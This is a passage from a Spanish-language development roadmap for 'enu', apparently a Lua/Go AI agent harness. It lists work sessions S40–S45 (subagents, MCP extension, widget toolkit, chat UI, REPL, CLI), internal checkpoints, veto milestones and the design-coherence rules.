| **S40** | **Subagentes** del agente (vía workers con `caps` recortadas / paquetes con nombre). | S39, S35 | agente.md §subagentes | Un subagente corre aislado con API recortada y devuelve resultado digerido. |
| **S41** | Extensión **MCP** (capa 2): `io.spawn` + JSON-RPC/stdio, ciclo de vida de procesos, mapeo de tools y su confianza. Cierra la cuestión abierta nº4 de arquitectura. | S16, S18, S39 | arquitectura §"Providers"/capa 2 | Un servidor MCP de prueba se lanza, anuncia tools y el agente las invoca. |
| **S42** | **Toolkit de widgets** (extensión Lua oficial, o Go si S28 vetó): árbol + nodos sucios, slots, focus, themes (nombres semánticos de color → literales, G22). | S29, S31 | arquitectura §"kernel"/nota ui | Un layout con focus entre dos widgets compone sin colisión entre plugins. |
| **S43** | Extensión **chat** (la UI oficial del harness) sobre toolkit + agente. | S42, S39 | [chat.md](../contracts/chat.md) | Conversación con streaming de tokens pintada con markdown; input multilínea. |
| **S44** | Extensión **repl** (REPL de Lua sobre la API pública; activable solo, sin el harness, G21). | S32 | arquitectura §"Distribución" | `enu` con solo `repl` activo evalúa expresiones Lua interactivamente. |
| **S45** | **Superficie CLI** (cuestión abierta nº5): flags de `enu -e`, `--auto-permissions`, headless, códigos de salida, azúcar `--continue` sobre `agent.session{resume}` (G18). | S39 | arquitectura §"Cuestiones abiertas" nº5 | `enu -e` ejecuta sin TTY con códigos de salida correctos; `--continue` reanuda la última sesión. |

---

La Fase 8 es larga, así que lleva checkpoints **internos**, no solo al cierre:

> 🔎 **CP-9 · El camino caliente completo, extremo a extremo** (tras S37;
> coincide con el hito de veto de perf). Prueba de humo: una vuelta de
> conversación contra un SSE **grabado** del adaptador Anthropic, pintada con
> markdown en streaming. Primera vez que HTTP stream → SSE → markdown → blit
> corre junto; mide la fluidez real (limitación nº8 de
> [modelo-ejecucion.md](../core/modelo-ejecucion.md)).

> 🔎 **CP-10 · Agente headless mínimo, usable** (tras S39). Prueba de humo:
> `enu -e` ejecuta un turno con una tool de fichero y un permiso **denegado**
> (error accionable), persistiendo la sesión en JSONL y reanudable. El caso
> CI/headless (G20) funciona sin una sola línea de UI.

> 🔎 **CP-11 · Dogfooding: usar enu para construir enu** (tras S43). Prueba de
> humo: una sesión de chat real de extremo a extremo contra un provider real.
> A partir de aquí, el resto del trabajo (repl, CLI, más adaptadores) puede
> hacerse con el propio enu — la señal de que el harness ya se sostiene.

## Hitos de validación

No todo el valor está en las features; tres puntos son **decisiones con veto**
(distintos de los checkpoints 🔎: un checkpoint comprueba que lo construido
encaja; un hito puede *reordenar el plan*):

- **S09 (watchdog) + S08 (cancelación)**: validan el modelo de robustez de
  ADR-008 (aislamiento por tarea, no por plugin). Si el desenrollado no
  capturable no se puede implementar limpio en gopher-lua, es un hallazgo mayor.
- **S28 (spike ADR-007)**: el veto del toolkit. Reordena toda la Fase 8 si cae.
- **S37 (primer adaptador real)**: primera vez que el camino caliente completo
  (HTTP stream → SSE → markdown → blit) corre de punta a punta. Valida que el
  rendimiento de Lua en el camino caliente (limitación nº8 de
  [modelo-ejecucion.md](../core/modelo-ejecucion.md)) es aceptable.

## Coherencia con el flujo de diseño

Este plan **no sustituye** al flujo de `problemas.md`/`adr.md`/`pospuesto.md`:
lo consume. Si una sesión destapa una grieta, se abre como `G##`, se resuelve en
*todos* los documentos afectados y solo entonces se implementa. Si una sesión
toma una decisión nueva (p. ej. el resultado del spike S28), se registra como un
ADR nuevo, nunca reescribiendo uno viejo. El código es el último eslabón de la
cadena de coherencia, no el primero.
